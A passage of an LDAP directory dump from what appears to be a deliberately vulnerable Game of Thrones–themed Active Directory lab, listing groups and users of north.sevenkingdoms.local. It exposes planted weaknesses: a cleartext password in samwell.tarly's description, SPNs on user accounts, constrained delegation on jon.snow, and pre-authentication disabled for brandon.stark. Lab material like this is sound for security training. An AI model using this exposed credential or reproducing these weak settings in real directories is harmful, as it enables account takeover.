distinguishedName: CN=Key Admins,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250413163148.0Z  
uSNCreated: 12409  
uSNChanged: 12411  
name: Key Admins  
objectGUID:: giz6mkPuGEClOvbsU3YiCQ==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGDgIAAA==  
sAMAccountName: Key Admins  
sAMAccountType: 268435456  
groupType: \-2147483646  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# DnsAdmins, Users, north.sevenkingdoms.local  
dn: CN=DnsAdmins,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: DnsAdmins  
description: DNS Administrators Group  
distinguishedName: CN=DnsAdmins,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163230.0Z  
whenChanged: 20250413163230.0Z  
uSNCreated: 12439  
uSNChanged: 12441  
name: DnsAdmins  
objectGUID:: 3AUtqGpPHkWbuK7wIn0XOw==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGTwQAAA==  
sAMAccountName: DnsAdmins  
sAMAccountType: 536870912  
groupType: \-2147483644  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z

\# DnsUpdateProxy, Users, north.sevenkingdoms.local  
dn: CN=DnsUpdateProxy,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: DnsUpdateProxy  
description: DNS clients who are permitted to perform dynamic updates on behal  
 f of some other clients (such as DHCP servers).  
distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=north,DC=sevenkingdoms,DC=loc  
 al  
instanceType: 4  
whenCreated: 20250413163232.0Z  
whenChanged: 20250413163232.0Z  
uSNCreated: 12444  
uSNChanged: 12444  
name: DnsUpdateProxy  
objectGUID:: Ac/U7LlAu02JfVqIx4IwZQ==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGUAQAAA==  
sAMAccountName: DnsUpdateProxy  
sAMAccountType: 268435456  
groupType: \-2147483646  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z

\# SEVENKINGDOMS$, Users, north.sevenkingdoms.local  
dn: CN=SEVENKINGDOMS$,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: SEVENKINGDOMS$  
distinguishedName: CN=SEVENKINGDOMS$,CN=Users,DC=north,DC=sevenkingdoms,DC=loc  
 al  
instanceType: 4  
whenCreated: 20250413164147.0Z  
whenChanged: 20250813142054.0Z  
uSNCreated: 13050  
uSNChanged: 405585  
name: SEVENKINGDOMS$  
objectGUID:: orgkvKQPXEKJXhFGg/CZew==  
userAccountControl: 2080  
badPwdCount: 0  
codePage: 0  
countryCode: 0  
badPasswordTime: 0  
lastLogoff: 0  
lastLogon: 0  
pwdLastSet: 133995684543711397  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGUgQAAA==  
accountExpires: 9223372036854775807  
logonCount: 0  
sAMAccountName: SEVENKINGDOMS$  
sAMAccountType: 805306370  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z

\# Stark, Users, north.sevenkingdoms.local  
dn: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Stark  
member: CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=hodor,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=rickon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=brandon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=sansa.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=robb.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=catelyn.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=eddard.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=arya.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
distinguishedName: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413164350.0Z  
whenChanged: 20250413164607.0Z  
uSNCreated: 13142  
memberOf: CN=Remote Desktop Users,CN=Builtin,DC=north,DC=sevenkingdoms,DC=loca  
 l  
uSNChanged: 13522  
name: Stark  
objectGUID:: bFcIQecrXUayFHD3UApZkg==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGUwQAAA==  
sAMAccountName: Stark  
sAMAccountType: 268435456  
managedBy: CN=eddard.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
groupType: \-2147483646  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z

\# Night Watch, Users, north.sevenkingdoms.local  
dn: CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Night Watch  
member: CN=jeor.mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=samwell.tarly,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
member: CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
distinguishedName: CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413164354.0Z  
whenChanged: 20250413164608.0Z  
uSNCreated: 13151  
uSNChanged: 13562  
name: Night Watch  
objectGUID:: YKQ5jmTfx0KzT67935azAA==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGVAQAAA==  
sAMAccountName: Night Watch  
sAMAccountType: 268435456  
managedBy: CN=jeor.mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
groupType: \-2147483646  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z

\# Mormont, Users, north.sevenkingdoms.local  
dn: CN=Mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Mormont  
member: CN=jeor.mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
distinguishedName: CN=Mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413164357.0Z  
whenChanged: 20250413164609.0Z  
uSNCreated: 13160  
uSNChanged: 13603  
name: Mormont  
objectGUID:: p0ZExV23pUy2L43HGzjN8A==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGVQQAAA==  
sAMAccountName: Mormont  
sAMAccountType: 268435456  
managedBy: CN=jeor.mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
groupType: \-2147483646  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z

\# AcrossTheSea, Users, north.sevenkingdoms.local  
dn: CN=AcrossTheSea,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: AcrossTheSea  
distinguishedName: CN=AcrossTheSea,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413164359.0Z  
whenChanged: 20250413164359.0Z  
uSNCreated: 13171  
uSNChanged: 13171  
name: AcrossTheSea  
objectGUID:: 2BhyGLPh5k21+jcQw8FTig==  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGVgQAAA==  
sAMAccountName: AcrossTheSea  
sAMAccountType: 536870912  
groupType: \-2147483644  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z

\# arya.stark, Users, north.sevenkingdoms.local  
dn: CN=arya.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: arya.stark  
sn: Stark  
l: Winterfell  
description: Arya Stark  
givenName: Arya  
distinguishedName: CN=arya.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413164402.0Z  
whenChanged: 20250617123516.0Z  
uSNCreated: 13202  
memberOf: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 223567  
name: arya.stark  
objectGUID:: Uh8o7lTxp0CK3IEgA1yAoQ==  
userAccountControl: 66048  
badPwdCount: 0  
codePage: 0  
countryCode: 0  
badPasswordTime: 133947303350066865  
lastLogoff: 0  
lastLogon: 133947304128191831  
pwdLastSet: 133890362420625263  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGVwQAAA==  
accountExpires: 9223372036854775807  
logonCount: 17  
sAMAccountName: arya.stark  
sAMAccountType: 805306368  
lockoutTime: 0  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
lastLogonTimestamp: 133946373167410756

\# eddard.stark, Users, north.sevenkingdoms.local  
dn: CN=eddard.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: eddard.stark  
sn: Stark  
l: King's Landing  
description: Eddard Stark  
givenName: Eddard  
distinguishedName: CN=eddard.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413164409.0Z  
whenChanged: 20250821212931.0Z  
uSNCreated: 13240  
memberOf: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
memberOf: CN=Domain Admins,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
memberOf: CN=Administrators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 431802  
name: eddard.stark  
objectGUID:: bLWMphZ3fUiqRIJAN+wnpg==  
userAccountControl: 66048  
badPwdCount: 0  
codePage: 0  
countryCode: 0  
badPasswordTime: 133906033337433005  
lastLogoff: 0  
lastLogon: 134006915718330267  
pwdLastSet: 133890362498903406  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGWAQAAA==  
adminCount: 1  
accountExpires: 9223372036854775807  
logonCount: 38839  
sAMAccountName: eddard.stark  
sAMAccountType: 805306368  
managedObjects: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
lockoutTime: 0  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413164658.0Z  
dSCorePropagationData: 16010101000000.0Z  
lastLogonTimestamp: 134002853712860244

\# catelyn.stark, Users, north.sevenkingdoms.local  
dn: CN=catelyn.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: catelyn.stark  
sn: Stark  
l: King's Landing  
description: Catelyn Stark  
givenName: Catelyn  
distinguishedName: CN=catelyn.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=loca  
 l  
instanceType: 4  
whenCreated: 20250413164417.0Z  
whenChanged: 20250501191334.0Z  
uSNCreated: 13275  
memberOf: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
memberOf: CN=Administrators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 74930  
name: catelyn.stark  
objectGUID:: bU1Yxwh8mEy50yDoRNaoJg==  
userAccountControl: 66048  
badPwdCount: 4  
codePage: 0  
countryCode: 0  
badPasswordTime: 133906033337745477  
lastLogoff: 0  
lastLogon: 0  
pwdLastSet: 133890362574212945  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGWQQAAA==  
adminCount: 1  
accountExpires: 9223372036854775807  
logonCount: 0  
sAMAccountName: catelyn.stark  
sAMAccountType: 805306368  
lockoutTime: 133906004146963988  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413170438.0Z  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101181632.0Z

\# robb.stark, Users, north.sevenkingdoms.local  
dn: CN=robb.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: robb.stark  
sn: Stark  
l: Winterfell  
description: Robb Stark  
givenName: Robb  
distinguishedName: CN=robb.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413164425.0Z  
whenChanged: 20250821175138.0Z  
uSNCreated: 13307  
memberOf: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
memberOf: CN=Administrators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 431338  
name: robb.stark  
objectGUID:: iU68gXjQ/k68S7hKd2TUiw==  
userAccountControl: 66048  
badPwdCount: 0  
codePage: 0  
countryCode: 0  
badPasswordTime: 133906033338057965  
lastLogoff: 0  
lastLogon: 134006917586142796  
pwdLastSet: 133890362650773062  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGWgQAAA==  
adminCount: 1  
accountExpires: 9223372036854775807  
logonCount: 65535  
sAMAccountName: robb.stark  
sAMAccountType: 805306368  
lockoutTime: 0  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413170438.0Z  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101181632.0Z  
lastLogonTimestamp: 134002722987703214

\# sansa.stark, Users, north.sevenkingdoms.local  
dn: CN=sansa.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: sansa.stark  
sn: Stark  
l: Winterfell  
description: Sansa Stark  
givenName: Sansa  
distinguishedName: CN=sansa.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413164432.0Z  
whenChanged: 20250501191334.0Z  
uSNCreated: 13328  
memberOf: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 74933  
name: sansa.stark  
objectGUID:: 0rqCfsGEA020ekg/S+p/+Q==  
userAccountControl: 66048  
badPwdCount: 4  
codePage: 0  
countryCode: 0  
badPasswordTime: 133906033338526774  
lastLogoff: 0  
lastLogon: 0  
pwdLastSet: 133890362727021016  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGWwQAAA==  
accountExpires: 9223372036854775807  
logonCount: 0  
sAMAccountName: sansa.stark  
sAMAccountType: 805306368  
lockoutTime: 133906004148057739  
servicePrincipalName: HTTP/eyrie.north.sevenkingdoms.local  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z

\# brandon.stark, Users, north.sevenkingdoms.local  
dn: CN=brandon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: brandon.stark  
sn: Stark  
l: Winterfell  
description: Brandon Stark  
givenName: Brandon  
distinguishedName: CN=brandon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=loca  
 l  
instanceType: 4  
whenCreated: 20250413164440.0Z  
whenChanged: 20250826113101.0Z  
uSNCreated: 13349  
memberOf: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 446265  
name: brandon.stark  
objectGUID:: UV0LODh9okWdcwPNV5r4FQ==  
userAccountControl: 4260352  
badPwdCount: 0  
codePage: 0  
countryCode: 0  
badPasswordTime: 133906033338839215  
lastLogoff: 0  
lastLogon: 134006814618017643  
pwdLastSet: 133890362809362500  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGXAQAAA==  
accountExpires: 9223372036854775807  
logonCount: 7  
sAMAccountName: brandon.stark  
sAMAccountType: 805306368  
lockoutTime: 0  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
lastLogonTimestamp: 134006814618017643

\# rickon.stark, Users, north.sevenkingdoms.local  
dn: CN=rickon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: rickon.stark  
sn: Stark  
l: Winterfell  
description: Rickon Stark  
givenName: Rickon  
distinguishedName: CN=rickon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413164450.0Z  
whenChanged: 20250501191335.0Z  
uSNCreated: 13369  
memberOf: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 74937  
name: rickon.stark  
objectGUID:: zr+0lJIyKEquX/3aH+h1Fw==  
userAccountControl: 66048  
badPwdCount: 4  
codePage: 0  
countryCode: 0  
badPasswordTime: 133906033339151714  
lastLogoff: 0  
lastLogon: 0  
pwdLastSet: 133890362909828574  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGXQQAAA==  
accountExpires: 9223372036854775807  
logonCount: 0  
sAMAccountName: rickon.stark  
sAMAccountType: 805306368  
lockoutTime: 133906004150870267  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z

\# hodor, Users, north.sevenkingdoms.local  
dn: CN=hodor,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: hodor  
sn: hodor  
l: Winterfell  
description: Brainless Giant  
givenName: hodor  
distinguishedName: CN=hodor,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413164501.0Z  
whenChanged: 20250826115453.0Z  
uSNCreated: 13389  
memberOf: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 446347  
name: hodor  
objectGUID:: bxp9HvS82Eem4JF3+3XPvQ==  
userAccountControl: 66048  
badPwdCount: 0  
codePage: 0  
countryCode: 0  
badPasswordTime: 133906033339620473  
lastLogoff: 0  
lastLogon: 134006828939111548  
pwdLastSet: 133890363011388387  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGXgQAAA==  
accountExpires: 9223372036854775807  
logonCount: 1  
sAMAccountName: hodor  
sAMAccountType: 805306368  
lockoutTime: 0  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
lastLogonTimestamp: 134006804788955766

\# jon.snow, Users, north.sevenkingdoms.local  
dn: CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: jon.snow  
sn: Snow  
l: Castel Black  
description: Jon Snow  
givenName: Jon  
distinguishedName: CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413164511.0Z  
whenChanged: 20250826122447.0Z  
uSNCreated: 13410  
memberOf: CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
memberOf: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 446409  
name: jon.snow  
objectGUID:: fUkhiUOM/Eegg4l1/SL1Lg==  
userAccountControl: 16843264  
badPwdCount: 4  
codePage: 0  
countryCode: 0  
badPasswordTime: 133906033339932964  
lastLogoff: 0  
lastLogon: 0  
pwdLastSet: 133890363111385766  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGXwQAAA==  
accountExpires: 9223372036854775807  
logonCount: 0  
sAMAccountName: jon.snow  
sAMAccountType: 805306368  
lockoutTime: 133906004151807735  
servicePrincipalName: CIFS/thewall.north.sevenkingdoms.local  
servicePrincipalName: HTTP/thewall.north.sevenkingdoms.local  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
lastLogonTimestamp: 134006846872080223  
msDS-AllowedToDelegateTo: CIFS/winterfell  
msDS-AllowedToDelegateTo: CIFS/winterfell.north.sevenkingdoms.local

\# samwell.tarly, Users, north.sevenkingdoms.local  
dn: CN=samwell.tarly,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: samwell.tarly  
sn: Tarly  
l: Castel Black  
description: Samwell Tarly (Password : Heartsbane)  
givenName: Samwell  
distinguishedName: CN=samwell.tarly,CN=Users,DC=north,DC=sevenkingdoms,DC=loca  
 l  
instanceType: 4  
whenCreated: 20250413164520.0Z  
whenChanged: 20250620082825.0Z  
uSNCreated: 13433  
memberOf: CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 232538  
name: samwell.tarly  
objectGUID:: \+3XyUCS/wEWacodAfY5ZFw==  
userAccountControl: 66048  
badPwdCount: 4  
codePage: 0  
countryCode: 0  
badPasswordTime: 133906033340245465  
lastLogoff: 0  
lastLogon: 133906003180088992  
pwdLastSet: 133890363200758446  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGYAQAAA==  
accountExpires: 9223372036854775807  
logonCount: 0  
sAMAccountName: samwell.tarly  
sAMAccountType: 805306368  
lockoutTime: 133906004868057765  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
lastLogonTimestamp: 133948817051316974

\# jeor.mormont, Users, north.sevenkingdoms.local  
dn: CN=jeor.mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: jeor.mormont  
sn: Mormont  
l: Castel Black  
description: Jeor Mormont  
givenName: Jeor  
distinguishedName: CN=jeor.mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413164527.0Z  
whenChanged: 20250501191335.0Z  
uSNCreated: 13454  
memberOf: CN=Mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
memberOf: CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 74944  
name: jeor.mormont  
objectGUID:: xF3whoXNHEy3c3JGRmrPZw==  
userAccountControl: 66048  
badPwdCount: 4  
codePage: 0  
countryCode: 0  
badPasswordTime: 133906033340714243  
lastLogoff: 0  
lastLogon: 0  
pwdLastSet: 133890363279037659  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGYQQAAA==  
accountExpires: 9223372036854775807  
logonCount: 0  
sAMAccountName: jeor.mormont  
sAMAccountType: 805306368  
managedObjects: CN=Mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
managedObjects: CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
lockoutTime: 133906004153526499  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z

\# sql\_svc, Users, north.sevenkingdoms.local  
dn: CN=sql\_svc,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: sql\_svc  
sn: service  
l: \-  
description: sql service  
givenName: sql  
distinguishedName: CN=sql\_svc,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413164535.0Z  
whenChanged: 20250501191335.0Z  
uSNCreated: 13478  
uSNChanged: 74946  
name: sql\_svc  
objectGUID:: 6W3LtavxeUm2xupD5zzZJA==  
userAccountControl: 66048  
badPwdCount: 4  
codePage: 0  
countryCode: 0  
badPasswordTime: 133906033341026711  
lastLogoff: 0  
lastLogon: 133890379301075552  
pwdLastSet: 133890363360129337  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGYgQAAA==  
accountExpires: 9223372036854775807  
logonCount: 19  
sAMAccountName: sql\_svc  
sAMAccountType: 805306368  
lockoutTime: 133906004153995246  
servicePrincipalName: MSSQLSvc/castelblack.north.sevenkingdoms.local  
servicePrincipalName: MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
lastLogonTimestamp: 133905724791495034

\# Administrator, Users, north.sevenkingdoms.local  
dn: CN=Administrator,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: Administrator  
description: Built-in account for administering the computer/domain  
distinguishedName: CN=Administrator,CN=Users,DC=north,DC=sevenkingdoms,DC=loca  
 l  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250501191848.0Z  
uSNCreated: 8196  
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=north,DC=sevenkingdoms,DC  
 \=local  
memberOf: CN=Domain Admins,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
memberOf: CN=Administrators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 75060  
name: Administrator  
objectGUID:: 0st6LHT8AUmx0hcYuY8pAg==  
userAccountControl: 66048  
badPwdCount: 2  
codePage: 0  
countryCode: 0  
badPasswordTime: 134006827095986543  
lastLogoff: 0  
lastLogon: 133890371749087354  
logonHours:: ////////////////////////////  
pwdLastSet: 133890348145251323  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhG9AEAAA==  
adminCount: 1  
accountExpires: 0  
logonCount: 21  
sAMAccountName: Administrator  
sAMAccountType: 805306368  
lockoutTime: 133906007281495303  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413164658.0Z  
dSCorePropagationData: 20250413164658.0Z  
dSCorePropagationData: 16010101000000.0Z  
lastLogonTimestamp: 133890358962445011

\# Guest, Users, north.sevenkingdoms.local  
dn: CN=Guest,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: Guest  
description: Built-in account for guest access to the computer/domain  
distinguishedName: CN=Guest,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250501191334.0Z  
uSNCreated: 8197  
memberOf: CN=Guests,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 74919  
name: Guest  
objectGUID:: VR2RHKs5JE6YBoSTIDjhjA==  
userAccountControl: 66082  
badPwdCount: 2  
codePage: 0  
countryCode: 0  
badPasswordTime: 134006827095986543  
lastLogoff: 0  
lastLogon: 0  
pwdLastSet: 0  
primaryGroupID: 514  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhG9QEAAA==  
accountExpires: 9223372036854775807  
logonCount: 0  
sAMAccountName: Guest  
sAMAccountType: 805306368  
lockoutTime: 133906004141495248  
